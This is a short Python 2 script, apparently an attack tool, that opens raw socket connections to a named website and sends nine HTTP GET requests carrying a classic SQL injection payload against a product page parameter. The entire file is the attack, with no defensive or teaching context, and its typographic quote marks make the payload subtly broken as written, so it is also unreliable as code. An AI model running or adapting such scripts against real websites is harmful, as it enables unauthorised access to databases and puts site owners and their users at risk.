#!/usr/bin/python
import socket, sys, os
def attack(host,SQLi):
    print "][ Attacking " + host  + " ... ]["
    print "injecting " + SQLi;
    #pid = os.fork()
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, 80))
    print ">> GET /" + SQLi + " HTTP/1.1"
    s.send("GET /" + SQLi + " HTTP/1.1\r\n")
    s.send("Host: " + host  + "\r\n\r\n");
    s.close()

for i in range(1, 10):
    attack("www.pagina.com","ver_productos.php?id=55′ or ‘1’=’1")

